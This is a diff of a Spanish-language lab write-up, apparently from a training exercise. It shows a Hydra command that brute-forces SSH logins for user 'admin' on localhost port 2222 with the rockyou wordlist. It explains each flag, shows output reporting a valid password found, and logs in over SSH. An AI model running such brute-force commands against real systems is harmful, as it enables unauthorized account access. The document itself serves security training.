@@ -2,16 +2,25 @@
 
 ## Comando utilizado para la obtencion de la contraseña del usuario admim
 
-```bash
+```cs
 hydra -s 2222 -l admin -P /usr/share/wordlists/rockyou.txt -e nsr -t 8 ssh://127.0.0.1 -v -f
 ```
-![alt text](image.png)
+![Comando de ataque](image.png)
 
 
-Aqui explicamos cada argumento 
+- Hydra: Llamamos la herramienta de Hydra.
+- -s: Definimos el numero de puerto usado para el ejercicio, ejemplo ==2222==.
+- -l: Definimos el nombre del usuario para la conexion, ejemplo ==admin==.
+- -P: Definimos el diccionario de contraseñas a usar para el ataque, ==/usr/share/wordlists/rockyou.txt==.
+- -e nsr: Definimos como entrada la opcion de una contraseña vacia(n), el nombre de usuario como contraseña(s), el nombre de usuario con las letras invertidas( r ).
+- -t: Definimos el numero de tareas en paralelo, ejemplo 8.
+- ssh: Definimos el protocolo victima, ejemplo SSH.
+- IP: Definimos la IP de la victima, ejemplo ==//127.0.0.1==.
+- -v: Activamos el modo Verbose, para ver información detallada del ataque.
+- -f: Termina el ataque cuando encuentre una contraseña valida.
 
 
-Aqui ponemos el resultado donde se muestra la informacion
+## Resultado del comando
 
 
 ```bash
@@ -30,6 +39,16 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-02-26 21:04:
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-02-26 21:07:50
 ```
-![alt text](image-1.png)
+![Contraseña para admin](image-1.png)
+
+## Conexion con el servicio SSH
+
+Probamos la conectividad con las credenciales obtenidas
+
+```cs
+ssh admin@127.0.0.1 -p 2222 
+```
+![Conexion exitosa](image-2.png)
+
 
 
